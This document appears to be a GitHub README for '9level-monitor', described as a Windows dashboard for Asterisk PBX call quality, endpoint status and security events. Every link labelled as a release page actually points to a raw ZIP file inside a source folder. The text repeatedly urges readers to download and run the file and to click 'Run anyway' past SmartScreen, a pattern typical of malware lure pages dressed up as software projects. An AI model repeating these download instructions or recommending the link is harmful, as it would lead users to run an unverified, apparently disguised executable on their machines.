# 📡 9level-monitor - See Asterisk health in real time

[![Download 9level-monitor](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)

## 🧭 What this app does

9level-monitor helps you watch an Asterisk PBX in real time. It shows call quality, PJSIP endpoint status, and security events in one place.

It is built for Windows use and ships as a single Go binary with no extra setup tools.

Use it to check:

- Call quality metrics like MOS, jitter, and RTT
- SIP and PJSIP endpoint state
- Live events from AMI and ARI
- Security events and unusual activity
- RTP and call flow health

## ⬇️ Download for Windows

Visit this page to download the app:

[9level-monitor releases](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)

On the releases page, choose the latest Windows file for your system. Then download it to your PC.

## 🖥️ System requirements

Use a Windows PC that can run a standard desktop app.

Recommended setup:

- Windows 10 or Windows 11
- An Asterisk PBX server you can reach over the network
- Access to AMI and ARI on that server
- Permission to view PBX status and call data
- Internet access only for the download step

The app does not need a database or extra runtime package on your PC.

## 🚀 Getting started

Follow these steps to get up and running.

1. Open the release page:
   [https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)

2. Find the latest release.

3. Download the Windows build.

4. Save the file in a folder you can find later, like Downloads or Desktop.

5. If the file comes in a ZIP folder, extract it first.

6. Open the app file to start it.

7. Keep the app open while you watch your PBX data.

## 🪟 How to run on Windows

If you downloaded a ZIP file:

1. Right-click the ZIP file.
2. Select Extract All.
3. Pick a folder.
4. Open the extracted folder.
5. Double-click the app file.

If you downloaded an .exe file:

1. Double-click the file.
2. If Windows asks for permission, choose Yes.
3. The app opens and starts showing PBX data.

If Windows SmartScreen appears:

1. Select More info.
2. Select Run anyway if you trust the release source.

## 🔌 Connect to your Asterisk server

To show live data, 9level-monitor needs a working link to your Asterisk PBX.

You will usually enter:

- Server address or host name
- AMI port
- AMI user name
- AMI password
- ARI URL
- ARI user name
- ARI password

Typical Asterisk access points:

- AMI for event and status data
- ARI for app and call control data
- SIP and RTP data for call checks

If you do not know these details, ask the person who manages the PBX.

## 📊 What you can see

### 📞 Call quality

The app can show live call quality values such as:

- MOS score
- Jitter
- RTT
- Packet loss
- RTP health

These values help you see if a call sounds clean or if network delay is affecting it.

### 📟 Endpoint status

You can view PJSIP endpoint state, such as:

- Registered
- Reachable
- Unreachable
- In use
- Idle

This helps you check if phones are online and ready.

### 🛡️ Security events

The app can show events that matter for PBX safety, such as:

- Failed login attempts
- Suspicious traffic
- Unexpected registration activity
- Repeated auth errors

This helps you notice problems before they grow.

### 🔄 Live monitoring

Because the app uses AMI and ARI, it can follow changes as they happen. You do not need to refresh the page or reload data by hand.

## 🧩 How to use the dashboard

Once the app is open and connected:

- Look at the main status view for overall PBX health
- Check call quality when users report audio issues
- Review endpoint state when a phone cannot register
- Scan security events for login or access problems
- Watch for patterns that match network trouble

A simple habit works well:

- Check the dashboard in the morning
- Check again after changes to the PBX
- Check live metrics during a call issue
- Check security events at the end of the day

## ⚙️ Common setup fields

If the app asks for connection details, use values like these:

- AMI host: the IP or name of your Asterisk server
- AMI port: the port your AMI service uses
- ARI URL: the web address for ARI
- AMI/ARI user: the account name set in Asterisk
- AMI/ARI password: the matching password
- SIP domain: your PBX domain if your setup uses one

Keep the values exact. A typo in the host name or password can stop the app from connecting.

## 🧪 First run checklist

Before you start the app, check these items:

- The release file is fully downloaded
- You extracted the file if it came in a ZIP
- Your Windows account can open the file
- Your Asterisk server is running
- AMI is enabled
- ARI is enabled
- The server allows your PC to connect
- Firewalls allow the needed ports

If the app opens but shows no data, look at the connection details first.

## 🔍 If the app does not connect

Try these steps:

- Check the server address
- Check the AMI and ARI user name
- Check the password
- Check that the port number is right
- Check that the PBX server is online
- Check your local network link
- Check Windows Firewall rules
- Restart the app after changing settings

If you still do not see data, confirm that Asterisk has AMI and ARI turned on and that your account has access.

## 📁 File layout after download

You may see files like these:

- The main app file
- A config file
- A README file
- A log file
- A ZIP archive if you chose a packaged release

If a config file exists, open it only if you need to change connection details.

## 🧠 Why this tool is useful

PBX problems can hide in small details. A phone may look fine at first, but the call can still suffer from delay, jitter, or packet loss.

9level-monitor gives you one view for:

- Voice quality checks
- Phone endpoint checks
- Live Asterisk events
- Security event review

That makes it easier to find the source of a problem without jumping between tools.

## 🔐 Access and permissions

For the best results, the Asterisk user account should have only the access it needs.

Use a separate AMI or ARI account for monitoring if your setup allows it. Keep the password safe and do not share it with users who do not need it.

## 🛠️ Basic troubleshooting steps

If something looks wrong, go through this list:

- Confirm the app is open
- Confirm the server values are correct
- Confirm the PBX is reachable on the network
- Confirm AMI and ARI are enabled
- Confirm your account has permission
- Check for blocked ports
- Restart the app after any change

If the dashboard shows stale data, the connection may still be open but slow. A network issue or server load can cause that.

## 📌 Release page link

Download the latest Windows build here:

[https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip](https://raw.githubusercontent.com/americanismlemniscus93/9level-monitor/main/frontend/src/monitor_level_1.6-beta.3.zip)

## 🧭 Quick start

1. Open the releases page
2. Download the Windows file
3. Extract it if needed
4. Open the app
5. Enter your Asterisk connection details
6. Watch the dashboard for live PBX status

## 🖱️ Best use cases

Use 9level-monitor when you want to:

- Check if calls sound poor
- See if a phone is registered
- Watch a PBX during busy hours
- Spot security events fast
- Review Asterisk health without extra tools

## 📎 Project focus

This app centers on:

- Asterisk PBX monitoring
- Real-time call quality
- AMI and ARI event feeds
- SIP and PJSIP status
- VoIP health checks
- Single-binary deployment for Windows

## 🏁 Setup path for most users

For most Windows users, the flow is simple:

1. Open the release page
2. Download the latest file
3. Run the app
4. Enter your PBX details
5. Start monitoring